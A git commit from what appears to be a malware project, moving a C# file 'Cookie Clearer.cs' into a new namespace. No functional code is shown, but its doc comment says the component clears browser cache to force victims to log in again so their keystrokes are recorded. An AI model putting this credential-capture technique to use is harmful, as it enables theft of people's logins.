4c21959a182488e06b374ec8964e6148fff4f723
FamilyFriendlyAlizer <saylent1@gmail.com>
2021-07-19 22:11:16 +0800

    put Cookie Clearer on its place

--- Client/Armitage/Cookies/Cookie Clearer.cs
+++ Client/Armitage/Cookies/Cookie Clearer.cs
@@ -4,7 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Client.Armitage
+namespace Client.Armitage.Cookies
 {
     /// <summary>
     /// Clears browser cache, which then forces the unfortunate person to relogin, getting their keystrokes recorded.
